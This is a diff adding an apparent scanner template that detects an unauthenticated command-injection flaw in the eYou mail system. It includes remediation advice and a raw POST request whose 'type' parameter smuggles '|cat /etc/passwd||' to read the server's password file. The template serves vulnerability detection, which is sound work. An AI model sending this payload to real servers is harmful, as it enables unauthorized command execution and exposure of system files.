@@ -1,0 +1,32 @@
+id: CNVD-2021-26422
+info:
+  name: eYouMail - Remote Code Execution
+  author:
+  - l0ne1y
+  description: |
+    eYou mail system remote command execution vulnerability
+
+    Beijing Eyou Information Technology Co., Ltd. (Eyou) is a professional mail system software and overall solution provider.
+
+    The eYou mail system has a remote command execution vulnerability. Attackers can exploit it to achieve remote command execution without authorization and obtain the target server's privileges.
+  severity: critical
+  remediation: "Official remedy:<br />1. Upgrade the system to a non-vulnerable version, or download the security patch from the official website.\nhttp://www.eyou.net/ \n\nTemporary remedy:<br
+    />1. Try not to execute external applications or commands.<br />2. Use custom functions or function libraries to implement the functionality of external applications or commands.<br />3. Before executing functions with command execution functionality such as system and eval, validate the parameter content.<br
+    />4. Use the escapeshellarg function to process related parameters. The escapeshellarg function escapes any character that could end a parameter or a command; for example, single quotes are escaped, double quotes are escaped, and semicolons are escaped. This confines the parameter content within a pair of single or double quotes, escaping the single or double quotes contained in the parameter so they cannot truncate the current execution, thereby preventing command injection attacks.<br
+    />5. Use safe_mode_exec_dir to specify the executable file path. Set safe_mode in the php.ini file to On, place the allowed executable files into a directory, and use safe_mode_exec_dir to specify this executable path. When an external program needs to be executed, it will only be allowed to run if it resides in the directory specified by safe_mode_exec_dir; otherwise execution will fail.'"
+requests:
+- matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    type='|cat /etc/passwd||'
